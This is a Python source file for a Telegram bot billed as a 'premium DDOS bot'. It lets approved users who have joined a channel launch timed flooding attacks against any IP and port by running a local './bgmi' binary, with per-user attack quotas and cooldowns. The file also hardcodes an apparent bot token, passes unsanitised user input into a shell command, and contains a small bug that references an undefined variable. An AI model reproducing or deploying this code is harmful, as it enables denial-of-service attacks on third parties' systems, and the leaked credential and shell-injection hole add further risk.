import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import os
import time

# Configuration
TELEGRAM_BOT_TOKEN = "8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs"
ADMIN_USER_ID = 1662672529
APPROVED_IDS_FILE = 'approved_ids.txt'
CHANNEL_ID = "@fyyffgggvvvgvvcc"
attack_in_progress = False
USER_ATTACKS = {}  # Stores attack details for users
DAILY_ATTACK_LIMIT = 5  # Default attack limit (can be set via /set)

# Check if the token is set
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set. Please set the token and try again.")

# Load and Save Functions for Approved IDs
def load_approved_ids():
    """Load approved user and group IDs from a file."""
    try:
        with open(APPROVED_IDS_FILE, 'r') as file:
            return set(line.strip() for line in file.readlines())
    except FileNotFoundError:
        return set()

def save_approved_ids():
    """Save approved user and group IDs to a file."""
    with open(APPROVED_IDS_FILE, 'w') as file:
        file.write("\n".join(approved_ids))

approved_ids = load_approved_ids()

# Helper Function: Check User Permissions
async def is_admin(chat_id):
    """Check if the user is the admin."""
    return chat_id == ADMIN_USER_ID

async def is_member_of_channel(user_id: int, context: CallbackContext):
    """Check if the user is a member of the specified channel."""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

# Commands
async def start(update: Update, context: CallbackContext):
    """Send a welcome message to the user."""
    chat_id = update.effective_chat.id
    message = (
        "*WELCOME TO GODxCHEATS DDOS*\n\n"
        "*PREMIUM DDOS BOT*\n"
        "*Owner*: @GODxAloneBOY\n"
        f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
        "Use /help to see available commands.\n"
        "Image: [Click Here](https://t.me/jwhu7hwbsnn/122)"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """Send a list of available commands and their usage."""
    chat_id = update.effective_chat.id
    message = (
        "*Available Commands:*\n\n"
        "/start - Start the bot and get a welcome message.\n"
        "/help - Show this help message.\n"
        "/approve <id> - Approve a user or group ID (admin only).\n"
        "/remove <id> - Remove a user or group ID (admin only).\n"
        "/details - Show attack details and user information.\n"
        "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
        "/set <limit_in_attacks> - Set global attack limit for all users (admin only).\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    """Approve a user or group ID to use the bot."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()

    if not target_id.lstrip('-').isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be a numeric ID.*", parse_mode='Markdown')
        return

    approved_ids.add(target_id)
    save_approved_ids()

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    """Remove a user or group ID from the approved list."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.remove(target_id)
        save_approved_ids()
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

async def details(update: Update, context: CallbackContext):
    """Show user attack details and username."""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not an approved user.*", parse_mode='Markdown')
        return

    # Fetch attack details for the user
    user_details = USER_ATTACKS.get(str(user_id), {"attacks_left": DAILY_ATTACK_LIMIT, "last_attack_time": 0})
    username = update.effective_user.username or "N/A"

    message = (
        f"*User Details for @{username}:*\n"
        f"Total attacks allowed today: {DAILY_ATTACK_LIMIT}\n"
        f"Attacks left: {user_details['attacks_left']}\n"
        f"Last attack time: {time.ctime(user_details['last_attack_time']) if user_details['last_attack_time'] else 'N/A'}\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def set_attack_limit(update: Update, context: CallbackContext):
    """Set global attack limit for all users."""
    global DAILY_ATTACK_LIMIT
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /set <limit_in_attacks>*", parse_mode='Markdown')
        return

    try:
        new_limit = int(args[0])
        if new_limit <= 0:
            raise ValueError("Limit must be a positive integer.")
        
        DAILY_ATTACK_LIMIT = new_limit

        # Update all users' attack limits in USER_ATTACKS
        for user_id in approved_ids:
            USER_ATTACKS[user_id] = {"attacks_left": DAILY_ATTACK_LIMIT, "last_attack_time": 0}

        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Global attack limit set to {new_limit} attacks per day for all users.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    """Launch an attack if the user is approved and a channel member."""
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    if not await is_member_of_channel(user_id, context):
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
        return

    user_attack_info = USER_ATTACKS.get(str(user_id), {"attacks_left": DAILY_ATTACK_LIMIT, "last_attack_time": 0})

    if user_attack_info['attacks_left'] <= 0:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You have no attacks left today.*", parse_mode='Markdown')
        return

    if time.time() - user_attack_info['last_attack_time'] < 300:
        remaining_cooldown = 300 - (time.time() - user_attack_info['last_attack_time'])
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You need to wait {int(remaining_cooldown)} seconds before you can attack again.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time_duration = args
    user_attack_info['attacks_left'] -= 1
    user_attack_info['last_attack_time'] = time.time()

    USER_ATTACKS[str(user_id)] = user_attack_info

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*✅ ATTACK INITIATED BY @{update.effective_user.username} ✅*\n\n"
            f"*🎯 Target IP:* {ip}\n"
            f"*🔌 Port:* {port}\n"
            f"*⏱ Duration:* {time_duration} seconds\n"
            "Image: [Click Here](https://t.me/jwhu7hwbsnn/122)"
        ),
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, time_duration, context))

async def run_attack(chat_id, ip, port, time, context):
    """Simulate an attack process."""
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*♥️ ATTACK FINISHED BY @{update.effective_user.username} ♥️*\n*FEEDBACK SEND KAR LAUDE*",
            parse_mode='Markdown'
        )

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("details", details))
    application.add_handler(CommandHandler("set", set_attack_limit))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
